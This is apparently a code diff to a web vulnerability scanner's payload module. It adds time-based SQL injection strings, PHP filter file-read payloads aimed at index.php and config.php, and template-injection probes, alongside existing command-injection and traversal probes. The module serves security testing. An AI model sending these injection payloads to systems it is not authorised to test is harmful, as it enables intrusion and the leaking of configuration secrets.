@@ -1,14 +1,13 @@
 """Payloads and detection signatures used by the active checks.
 
-Everything here is intentionally *non-destructive*: probes either trigger an
-error message, get reflected, or read a world-readable file (``/etc/passwd``).
+Everything here is intentionally non-destructive: probes either trigger an
+error, get reflected, read a world-readable file, or evaluate harmless math.
 None of them modify data, escalate access, or run harmful commands.
 """
 
 from __future__ import annotations
 
 import re
-
 
 SQLI_ERROR_PAYLOADS = ["'", '"', "')", "';", "' OR '1"]
 
@@ -37,7 +36,6 @@ SQLI_FALSE_PAYLOAD = "' AND '1'='2"
 
 
 def match_sql_error(body: str) -> str:
-    """Return the matched error fragment, or '' if none of the signatures hit."""
     if not body:
         return ""
     for sig in SQL_ERROR_SIGNATURES:
@@ -45,6 +43,20 @@ def match_sql_error(body: str) -> str:
         if m:
             return m.group(0)
     return ""
+
+
+def sqli_time_payloads(seconds: int) -> list[str]:
+    return [
+        f"1' AND SLEEP({seconds})-- -",
+        f'1" AND SLEEP({seconds})-- -',
+        f"1' AND pg_sleep({seconds})-- -",
+        f"1'; WAITFOR DELAY '0:0:{seconds}'-- -",
+        f"1) AND SLEEP({seconds})-- -",
+    ]
+
+
+def time_based_triggered(baseline_s: float, delayed_s: float, sleep_s: float) -> bool:
+    return baseline_s < sleep_s and (delayed_s - baseline_s) >= sleep_s * 0.7
 
 
 TRAVERSAL_PAYLOADS = [
@@ -62,6 +74,16 @@ def match_passwd(body: str) -> str:
         return ""
     m = PASSWD_RE.search(body)
     return m.group(0) if m else ""
+
+
+LFI_PHP_MARKER = "PD9waHA"
+
+LFI_PAYLOADS = [
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=config.php",
+    "php://filter/convert.base64-encode/resource=../index.php",
+]
 
 
 REDIRECT_PARAM_NAMES = {
@@ -85,11 +107,6 @@ def xss_reflected_raw(body: str, token: str) -> bool:
 
 
 def cmdi_payloads(a: int, b: int, left: str, right: str) -> list[str]:
-    """Arithmetic-echo probes: the shell prints ``left + (a*b) + right``.
-
-    The product is computed by the shell and never appears literally in the
-    payload, so a plain reflection of the input cannot produce a false match.
-    """
     expr = f"$(({a}*{b}))"
     inner = f"echo {left}{expr}{right}"
     return [
@@ -103,4 +120,21 @@ def cmdi_payloads(a: int, b: int, left: str, right: str) -> list[str]:
 
 
 def cmdi_expected(a: int, b: int, left: str, right: str) -> str:
+    return f"{left}{a * b}{right}"
+
+
+def ssti_payloads(a: int, b: int, left: str, right: str) -> list[str]:
+    e = f"{a}*{b}"
+    return [
+        left + "{{" + e + "}}" + right,
+        left + "${" + e + "}" + right,
+        left + "#{" + e + "}" + right,
+        left + "<%= " + e + " %>" + right,
+        left + "{" + e + "}" + right,
+        left + "*{" + e + "}" + right,
+        left + "${{" + e + "}}" + right,
+    ]
+
+
+def ssti_expected(a: int, b: int, left: str, right: str) -> str:
     return f"{left}{a * b}{right}"
